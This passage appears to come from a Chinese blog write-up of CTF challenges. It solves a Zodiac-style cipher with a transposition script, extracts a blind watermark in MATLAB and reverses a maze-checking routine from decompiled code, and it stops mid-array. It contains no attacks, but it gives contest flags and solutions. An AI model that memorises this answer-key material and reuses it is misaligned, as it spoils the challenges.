class="hljs-comment"># b'flag{R3im@aging_1ndir3ctly_LoL}\x00'</span></span><br></pre></td></tr></tbody></table></figure><h2 id="十二宫的挑衅"><a href="#十二宫的挑衅" class="headerlink" title="十二宫的挑衅"></a>十二宫的挑衅</h2><p>密码本身有点难度，但是因为和zodiac密码的解码方法完全相同，所以只要照着步骤做就很容易解出来</p><p>先对密文进行一个简单的换位</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="hljs-string">'''^#@$@#()/&gt;@?==%1(</span></span><br><span class="line"><span class="hljs-string">!)&gt;(*+3&lt;#86@-7$^.</span></span><br><span class="line"><span class="hljs-string">4&amp;)8%#5&amp;6!=%1#$-$</span></span><br><span class="line"><span class="hljs-string">+5&amp;?#!.03!%=@=101</span></span><br><span class="line"><span class="hljs-string">0?(*~#??.+)%&amp;.7^8</span></span><br><span class="line"><span class="hljs-string">=1%*^=$5$7@@8&gt;&amp;*9</span></span><br><span class="line"><span class="hljs-string">9@0185(+7)&lt;%3#@^4</span></span><br><span class="line"><span class="hljs-string">&amp;@@&lt;.)$3*#%%&lt;&lt;*++</span></span><br><span class="line"><span class="hljs-string">.@.?=~**+!==65^@&amp;'''</span></span><br><span class="line">a = s.split(<span class="hljs-string">'\n'</span>)</span><br><span class="line"><span class="hljs-comment"># print(a)</span></span><br><span class="line">i = <span class="hljs-number">0</span></span><br><span class="line">j = <span class="hljs-number">0</span></span><br><span class="line">cc = []</span><br><span class="line"><span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span> * <span class="hljs-number">17</span>):</span><br><span class="line">    cc.append(a[j % <span class="hljs-number">9</span>][i % <span class="hljs-number">17</span>])</span><br><span class="line">    <span class="hljs-keyword">if</span> (z + <span class="hljs-number">1</span>) % <span class="hljs-number">17</span> == <span class="hljs-number">0</span>:</span><br><span class="line">        cc.append(<span class="hljs-string">'\n'</span>)</span><br><span class="line">    i += <span class="hljs-number">2</span></span><br><span class="line">    j += <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">""</span>.join(cc))</span><br></pre></td></tr></tbody></table></figure><p>然后放到AZdecrypt里面跑一下就出来了</p><figure class="highlight vbnet hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IKILLED A LOT <span class="hljs-keyword">OF</span> PEOPLE <span class="hljs-built_in">AND</span> THE PEOPLE I </span><br><span class="line">KILLED WILL BECOME SLAVES <span class="hljs-keyword">TO</span> SERVE <span class="hljs-keyword">ME</span> THIS </span><br><span class="line"><span class="hljs-built_in">IS</span> FLAG WUUHUU <span class="hljs-keyword">TAKE</span> <span class="hljs-keyword">OFF</span> I HOPE YOU CAN DECRYPT </span><br><span class="line">IT <span class="hljs-keyword">AS</span> SOON <span class="hljs-keyword">AS</span> POSSIBLE <span class="hljs-built_in">OR</span> I WILL <span class="hljs-keyword">CONTINUE</span> </span><br><span class="line"><span class="hljs-keyword">TO</span> COMMIT THE CRIME</span><br></pre></td></tr></tbody></table></figure><p><del>就是flag确实不太好认</del></p><h2 id="snowww"><a href="#snowww" class="headerlink" title="snowww"></a>snowww</h2><p>盲水印，binwalk跑出结果有一个matlab脚本，在<a href="https://www.zhihu.com/question/50735753/answer/122593277">这里</a>找到讲解和提取水印的脚本</p><figure class="highlight matlab hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">clc;clear;close all;</span><br><span class="line">alpha = <span class="hljs-number">1</span>;</span><br><span class="line"></span><br><span class="line">im = double(imread(<span class="hljs-string">'original.jpg'</span>))/<span class="hljs-number">255</span>;</span><br><span class="line">FA=fft2(im);</span><br><span class="line">ori=double(imread(<span class="hljs-string">'attack.jpg'</span>))/<span class="hljs-number">255</span>;</span><br><span class="line">FB=fft2(ori);</span><br><span class="line">imsize = <span class="hljs-built_in">size</span>(im);</span><br><span class="line">load(<span class="hljs-string">'encode.mat'</span>);</span><br><span class="line">FAO=ifft2(FB);</span><br><span class="line">RI = FAO-double(im);</span><br><span class="line">xl = <span class="hljs-number">1</span>:imsize(<span class="hljs-number">2</span>);</span><br><span class="line">yl = <span class="hljs-number">1</span>:imsize(<span class="hljs-number">1</span>);</span><br><span class="line">[xx,yy] = <span class="hljs-built_in">meshgrid</span>(xl,yl);</span><br><span class="line"></span><br><span class="line">FA2=fft2(FAO);</span><br><span class="line">G=(FA2-FA)/alpha;</span><br><span class="line">GG=G;</span><br><span class="line"><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:imsize(<span class="hljs-number">1</span>)*<span class="hljs-number">0.5</span></span><br><span class="line">    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span>=<span class="hljs-number">1</span>:imsize(<span class="hljs-number">2</span>)</span><br><span class="line">        GG(M(<span class="hljs-built_in">i</span>),N(<span class="hljs-built_in">j</span>),:)=G(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>,:);</span><br><span class="line">    <span class="hljs-keyword">end</span></span><br><span class="line"><span class="hljs-keyword">end</span></span><br><span class="line"><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:imsize(<span class="hljs-number">1</span>)*<span class="hljs-number">0.5</span></span><br><span class="line">    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span>=<span class="hljs-number">1</span>:imsize(<span class="hljs-number">2</span>)</span><br><span class="line">        GG(imsize(<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>-<span class="hljs-built_in">i</span>,imsize(<span class="hljs-number">2</span>)+<span class="hljs-number">1</span>-<span class="hljs-built_in">j</span>,:)=GG(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>,:);</span><br><span class="line">    <span class="hljs-keyword">end</span></span><br><span class="line"><span class="hljs-keyword">end</span></span><br><span class="line"><span class="hljs-built_in">figure</span>,imshow(GG);title(<span class="hljs-string">'extracted watermark'</span>);</span><br></pre></td></tr></tbody></table></figure><p>跑出结果</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/3133848147.png" alt="snow-1.png"></p><p><del>我当时以为这已经是对我眼睛最大的考验了</del></p><h2 id="SuperBrain"><a href="#SuperBrain" class="headerlink" title="SuperBrain"></a>SuperBrain</h2><p>似乎是一个开发板的程序，进行一系列初始化之后运行主程序</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/253024555.png" alt="superbrain-1.png"></p><p>首先会进行通信，接收地图数据和答案数据</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/3289130296.png" alt="superbrain-2.png"></p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/3801641259.png" alt="superbrain-3.png"></p><p>可以看到一共接收了36组地图和36个答案，然后执行程序判断答案是否正确</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/1411425325.png" alt="superbrain-4.png"></p><p>每次执行传入一个地图和对应的答案</p><p>执行的程序主要算法如下</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">answer = (<span class="hljs-keyword">char</span>)answer;</span><br><span class="line">LABEL_10:</span><br><span class="line">  line = &amp;map[<span class="hljs-number">7</span> * answer + <span class="hljs-number">1</span>];</span><br><span class="line">  <span class="hljs-keyword">while</span> ( index &lt; <span class="hljs-number">7</span> &amp;&amp; answer &gt;= <span class="hljs-number">0</span> &amp;&amp; answer &lt; <span class="hljs-number">7</span> )</span><br><span class="line">  {</span><br><span class="line">    addr = &amp;line[index];</span><br><span class="line">    ele = line[index];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( answer % <span class="hljs-number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( line[index] )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( ele == <span class="hljs-number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          *addr = <span class="hljs-number">0</span>;</span><br><span class="line">          v8 = <span class="hljs-number">0</span>;</span><br><span class="line">          --answer;</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> ( ele != <span class="hljs-number">2</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="hljs-keyword">if</span> ( ele != <span class="hljs-number">3</span> )</span><br><span class="line">            <span class="hljs-keyword">return</span> v8 == <span class="hljs-number">1</span>;</span><br><span class="line">          *addr = <span class="hljs-number">2</span>;</span><br><span class="line">          v8 = <span class="hljs-number">2</span>;</span><br><span class="line">          ++answer;</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">        }</span><br><span class="line">        *addr = <span class="hljs-number">1</span>;</span><br><span class="line">        v8 = <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( ++index &gt;= <span class="hljs-number">0</span> )</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        *addr = <span class="hljs-number">3</span>;</span><br><span class="line">        v8 = <span class="hljs-number">3</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( --index &gt;= <span class="hljs-number">0</span> )</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">return</span> v8 == <span class="hljs-number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( line[index] )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( ele == <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        *addr = <span class="hljs-number">2</span>;</span><br><span class="line">        v8 = <span class="hljs-number">2</span>;</span><br><span class="line">        ++answer;</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> ( ele != <span class="hljs-number">2</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( ele != <span class="hljs-number">3</span> )</span><br><span class="line">          <span class="hljs-keyword">return</span> v8 == <span class="hljs-number">1</span>;</span><br><span class="line">        *addr = <span class="hljs-number">0</span>;</span><br><span class="line">        v8 = <span class="hljs-number">0</span>;</span><br><span class="line">        --answer;</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">      }</span><br><span class="line">      *addr = <span class="hljs-number">3</span>;</span><br><span class="line">      v8 = <span class="hljs-number">3</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( --index &gt;= <span class="hljs-number">0</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">      <span class="hljs-keyword">return</span> v8 == <span class="hljs-number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    *addr = <span class="hljs-number">1</span>;</span><br><span class="line">    v8 = <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( ++index &lt; <span class="hljs-number">0</span> )</span><br><span class="line">      <span class="hljs-keyword">return</span> v8 == <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> v8 == <span class="hljs-number">1</span>;</span><br></pre></td></tr></tbody></table></figure><p>可以看到类似于走迷宫的算法，分奇偶行执行不同的操作，然后发现答案只传入0-6这7种数字，直接遍历就可以跑出答案</p><p>最后一部分输出flag，需要一些数据在内存里都找的到</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/1235013662.png" alt="superbrain-5.png"></p><p>很容易可以解出来</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">runGame</span><span class="hljs-params">(<span class="hljs-keyword">char</span> (*gamemap)[<span class="hljs-number">7</span>], <span class="hljs-keyword">uint8_t</span> startPoint)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">char</span> answer; <span class="hljs-comment">// r18</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// r17</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// r6</span></span><br><span class="line">    <span class="hljs-keyword">int</span> index; <span class="hljs-comment">// r19</span></span><br><span class="line">    <span class="hljs-keyword">char</span> *v11; <span class="hljs-comment">// r5</span></span><br><span class="line">    <span class="hljs-keyword">char</span> *v12; <span class="hljs-comment">// r4</span></span><br><span class="line">    <span class="hljs-keyword">char</span> *v13; <span class="hljs-comment">// r4</span></span><br><span class="line">    <span class="hljs-keyword">char</span> *v14; <span class="hljs-comment">// r5</span></span><br><span class="line">    <span class="hljs-keyword">char</span> *line; <span class="hljs-comment">// r20</span></span><br><span class="line">    <span class="hljs-keyword">char</span> *addr; <span class="hljs-comment">// r3</span></span><br><span class="line">    <span class="hljs-keyword">int</span> ele; <span class="hljs-comment">// r6</span></span><br><span class="line">    <span class="hljs-keyword">char</span> map[<span class="hljs-number">61</span>]; <span class="hljs-comment">// [sp+7h] [-79h] BYREF</span></span><br><span class="line">    index = <span class="hljs-number">0</span>;</span><br><span class="line">    answer = startPoint;</span><br><span class="line">    v8 = <span class="hljs-number">-1</span>;</span><br><span class="line">    v9 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">do</span> {</span><br><span class="line">        v11 = &amp;map[<span class="hljs-number">7</span> * v9];</span><br><span class="line">        v12 = &amp;(*gamemap)[<span class="hljs-number">7</span> * v9 - <span class="hljs-number">1</span>];</span><br><span class="line">        <span class="hljs-keyword">do</span> {</span><br><span class="line">            *++v11 = *++v12;</span><br><span class="line">            ++index;</span><br><span class="line">        } <span class="hljs-keyword">while</span> (((index - <span class="hljs-number">7</span>) &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>);</span><br><span class="line">        <span class="hljs-keyword">for</span> (; index &lt; <span class="hljs-number">7</span>; index += <span class="hljs-number">2</span>) {</span><br><span class="line">            v13 = v12 + <span class="hljs-number">1</span>;</span><br><span class="line">            v14 = v11 + <span class="hljs-number">1</span>;</span><br><span class="line">            *v14 = *v13;</span><br><span class="line">            v12 = v13 + <span class="hljs-number">1</span>;</span><br><span class="line">            v11 = v14 + <span class="hljs-number">1</span>;</span><br><span class="line">            *v11 = *v12;</span><br><span class="line">        }</span><br><span class="line">        ++v9;</span><br><span class="line">        index = <span class="hljs-number">0</span>;</span><br><span class="line">    } <span class="hljs-keyword">while</span> (v9 &lt; <span class="hljs-number">7</span>);</span><br><span class="line">    answer = (<span class="hljs-keyword">char</span>) answer;</span><br><span class="line">    LABEL_10:</span><br><span class="line">    line = &amp;map[<span class="hljs-number">7</span> * answer + <span class="hljs-number">1</span>];</span><br><span class="line">    <span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">7</span> &amp;&amp; answer &gt;= <span class="hljs-number">0</span> &amp;&amp; answer &lt; <span class="hljs-number">7</span>) {</span><br><span class="line">        addr = &amp;line[index];</span><br><span class="line">        ele = line[index];</span><br><span class="line">        <span class="hljs-keyword">if</span> (answer % <span class="hljs-number">2</span>) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (line[index]) {</span><br><span class="line">                <span class="hljs-keyword">if</span> (ele == <span class="hljs-number">1</span>) {</span><br><span class="line">                    *addr = <span class="hljs-number">0</span>;</span><br><span class="line">                    v8 = <span class="hljs-number">0</span>;</span><br><span class="line">                    --answer;</span><br><span class="line">                    <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">                }</span><br><span class="line">                <span class="hljs-keyword">if</span> (ele != <span class="hljs-number">2</span>) {</span><br><span class="line">                    <span class="hljs-keyword">if</span> (ele != <span class="hljs-number">3</span>)</span><br><span class="line">                        <span class="hljs-keyword">return</span> v8 == <span class="hljs-number">1</span>;</span><br><span class="line">                    *addr = <span class="hljs-number">2</span>;</span><br><span class="line">                    v8 = <span class="hljs-number">2</span>;</span><br><span class="line">                    ++answer;</span><br><span class="line">                    <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">                }</span><br><span class="line">                *addr = <span class="hljs-number">1</span>;</span><br><span class="line">                v8 = <span class="hljs-number">1</span>;</span><br><span class="line">                <span class="hljs-keyword">if</span> (++index &gt;= <span class="hljs-number">0</span>)</span><br><span class="line">                    <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">            } <span class="hljs-keyword">else</span> {</span><br><span class="line">                *addr = <span class="hljs-number">3</span>;</span><br><span class="line">                v8 = <span class="hljs-number">3</span>;</span><br><span class="line">                <span class="hljs-keyword">if</span> (--index &gt;= <span class="hljs-number">0</span>)</span><br><span class="line">                    <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">return</span> v8 == <span class="hljs-number">1</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (line[index]) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (ele == <span class="hljs-number">1</span>) {</span><br><span class="line">                *addr = <span class="hljs-number">2</span>;</span><br><span class="line">                v8 = <span class="hljs-number">2</span>;</span><br><span class="line">                ++answer;</span><br><span class="line">                <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">if</span> (ele != <span class="hljs-number">2</span>) {</span><br><span class="line">                <span class="hljs-keyword">if</span> (ele != <span class="hljs-number">3</span>)</span><br><span class="line">                    <span class="hljs-keyword">return</span> v8 == <span class="hljs-number">1</span>;</span><br><span class="line">                *addr = <span class="hljs-number">0</span>;</span><br><span class="line">                v8 = <span class="hljs-number">0</span>;</span><br><span class="line">                --answer;</span><br><span class="line">                <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">            }</span><br><span class="line">            *addr = <span class="hljs-number">3</span>;</span><br><span class="line">            v8 = <span class="hljs-number">3</span>;</span><br><span class="line">            <span class="hljs-keyword">if</span> (--index &gt;= <span class="hljs-number">0</span>)</span><br><span class="line">                <span class="hljs-keyword">goto</span> LABEL_10;</span><br><span class="line">            <span class="hljs-keyword">return</span> v8 == <span class="hljs-number">1</span>;</span><br><span class="line">        }</span><br><span class="line">        *addr = <span class="hljs-number">1</span>;</span><br><span class="line">        v8 = <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> (++index &lt; <span class="hljs-number">0</span>)</span><br><span class="line">            <span class="hljs-keyword">return</span> v8 == <span class="hljs-number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> v8 == <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">char</span> gameMap[<span class="hljs-number">36</span>][<span class="hljs-number">11</span>][<span class="hljs-number">7</span>] = {{</span><br><span class="line">                                      {<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,},</span><br><span class="line">                                      {<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>,},</span><br><span class="line">                                      {<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>,},</span><br><span class="line">                                      {<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>,},</span><br><span class="line">                                      {<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>,},</span><br><span class="line">                                      {<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>,},</span><br><span class="line">                                      {<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>,},</span><br><span class="line">                              },</span><br><span class="line">                              {</span><br><span class="line">                                      {<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>,},</span><br><span class="line">                                      {<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,},</span><br><span class="line">                                      {<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,},</span><br><span class="line">                                      {<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,},</span><br><span class="line">                                      {<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,},</span><br><span class="line">                                      {<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, 